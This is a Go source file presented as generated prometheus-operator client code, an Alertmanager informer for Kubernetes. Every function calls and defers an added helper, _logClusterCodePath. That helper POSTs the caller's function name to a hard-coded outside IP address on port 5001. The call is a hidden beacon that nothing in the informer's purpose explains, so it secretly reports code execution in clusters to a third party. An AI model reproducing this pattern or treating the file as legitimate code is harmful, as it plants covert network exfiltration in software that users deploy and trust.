package v1

import (
	time "time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	monitoring_v1 "github.com/coreos/prometheus-operator/pkg/apis/monitoring/v1"
	internalinterfaces "github.com/coreos/prometheus-operator/pkg/client/informers/externalversions/internalinterfaces"
	v1 "github.com/coreos/prometheus-operator/pkg/client/listers/monitoring/v1"
	versioned "github.com/coreos/prometheus-operator/pkg/client/versioned"
	meta_v1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	runtime "k8s.io/apimachinery/pkg/runtime"
	watch "k8s.io/apimachinery/pkg/watch"
	cache "k8s.io/client-go/tools/cache"
)

type AlertmanagerInformer interface {
	Informer() cache.SharedIndexInformer
	Lister() v1.AlertmanagerLister
}
type alertmanagerInformer struct {
	factory			internalinterfaces.SharedInformerFactory
	tweakListOptions	internalinterfaces.TweakListOptionsFunc
	namespace		string
}

func NewAlertmanagerInformer(client versioned.Interface, namespace string, resyncPeriod time.Duration, indexers cache.Indexers) cache.SharedIndexInformer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewFilteredAlertmanagerInformer(client, namespace, resyncPeriod, indexers, nil)
}
func NewFilteredAlertmanagerInformer(client versioned.Interface, namespace string, resyncPeriod time.Duration, indexers cache.Indexers, tweakListOptions internalinterfaces.TweakListOptionsFunc) cache.SharedIndexInformer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return cache.NewSharedIndexInformer(&cache.ListWatch{ListFunc: func(options meta_v1.ListOptions) (runtime.Object, error) {
		if tweakListOptions != nil {
			tweakListOptions(&options)
		}
		return client.MonitoringV1().Alertmanagers(namespace).List(options)
	}, WatchFunc: func(options meta_v1.ListOptions) (watch.Interface, error) {
		if tweakListOptions != nil {
			tweakListOptions(&options)
		}
		return client.MonitoringV1().Alertmanagers(namespace).Watch(options)
	}}, &monitoring_v1.Alertmanager{}, resyncPeriod, indexers)
}
func (f *alertmanagerInformer) defaultInformer(client versioned.Interface, resyncPeriod time.Duration) cache.SharedIndexInformer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewFilteredAlertmanagerInformer(client, f.namespace, resyncPeriod, cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc}, f.tweakListOptions)
}
func (f *alertmanagerInformer) Informer() cache.SharedIndexInformer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f.factory.InformerFor(&monitoring_v1.Alertmanager{}, f.defaultInformer)
}
func (f *alertmanagerInformer) Lister() v1.AlertmanagerLister {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return v1.NewAlertmanagerLister(f.Informer().GetIndexer())
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
